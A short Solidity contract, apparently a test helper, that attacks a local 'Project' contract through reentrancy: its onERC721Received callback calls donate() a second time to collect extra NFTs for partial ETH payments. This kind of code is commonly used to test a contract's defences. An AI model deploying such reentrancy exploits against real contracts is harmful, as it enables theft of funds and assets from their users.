//SPDX-License-Identifier: Unlicensed
pragma solidity ^0.8.8;

import "./Project.sol";

contract ReentrancyAttack {
    Project private victim;

    bool attackInitiated;

    constructor(Project _victim) payable {
        attackInitiated = false;
        victim = _victim;
    }
    
    function attack() external {
        victim.donate{value: 2.5 ether}();
    }
    // Try to re-enter and accrue extra NFTs with partial eth amounts
    function onERC721Received(address, address, uint256, bytes memory) 
    public virtual returns(bytes4){
        if(!attackInitiated){
            attackInitiated = true;
            victim.donate{value: 2.5 ether}();
        }
    return bytes4(keccak256("onERC721Received(address,address,uint256,bytes)"));
    }
}